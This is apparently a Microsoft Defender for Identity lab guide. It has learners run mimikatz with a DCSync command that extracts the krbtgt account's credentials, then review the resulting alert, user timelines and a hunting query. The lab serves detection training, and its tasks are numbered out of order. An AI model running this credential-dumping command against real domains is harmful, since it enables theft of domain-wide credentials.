### Task 1: Simulate and Detect Lateral Movement Attacks `(Read-Only)`

In this task, you will simulate a Lateral Movement attack and detect it using Microsoft Defender for Identity. Please note that this is a `read-only` task, as you will be logged out of your virtual machine during the attack simulationâ€”this is a security measure enforced by Defender for Identity.

1. Open **PowerShell (Admin)** and navigate to the below-mentioned directory.

      ```powershell
      cd C:\MimikatzLab\mimikatz-master\mimikatz-master\x64
      ```
1. In the same PowerShell session, run the below command to run the mimikatz application

     ```powershell
     mimikatz.exe 
     ```

1. Simulate a DC Sync attack and extract the credentials of the krbtgt account.

      ```shell
      lsadump::dcsync /domain:yourdomain.com /user:krbtgt
      ```

1. Now you can check your alerts in the Microsoft Defender portal, navigate to **Incidents & alerts** in the left-hand navigation pane.

     - **Lateral movement using RDP blocked**

      > **Note:** The user will be logged out of the virtual machine as part of the containment measures initiated by the Defender in response to the user's attempted lateral movement attack.


### Task 4: Investigate Threats and User Timelines 

In this task you will analyze using user timelines and alert details in the Defender portal.

1. In the Microsoft Defender portal, in the search bar, type `demouser` and select it.

### Task 3: Review and Run Advanced Hunting Queries for Identity Signals

In this task you will use advanced hunting queries in the Defender portal to detect identity-based threats.

1. In the Microsoft Defender portal, click **Hunting** in the left-hand navigation pane and select **Advanced hunting** from the menu.

      ![](./media/E1T5S1.png)

1. In the query editor, paste the following KQL query to detect Lateral movement attacks:

   ```kql
   AlertInfo
   | summarize AlertCount = count() by Title, DetectionSource
   | order by AlertCount desc
   ```
   - Click **Run query** to execute.
